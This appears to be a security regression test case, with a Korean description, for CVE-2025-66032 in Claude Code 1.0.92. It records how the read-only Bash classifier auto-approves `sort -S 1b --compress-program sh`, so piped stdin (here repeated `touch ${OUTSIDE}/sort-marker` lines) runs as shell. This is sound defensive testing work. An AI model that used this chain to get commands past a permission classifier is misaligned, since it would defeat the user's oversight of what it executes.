description: CVE-2025-66032 sort --compress-program chain의 known-vulnerable case다. Claude Code 1.0.92의 read-only Bash classifier가 `sort -S 1b --compress-program sh`를 auto-approve해 attacker-controlled stdin이 sh로 실행되는지 확인한다.

argv:
echo 'touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker
touch ${OUTSIDE}/sort-marker' | sort -S 1b --compress-program sh
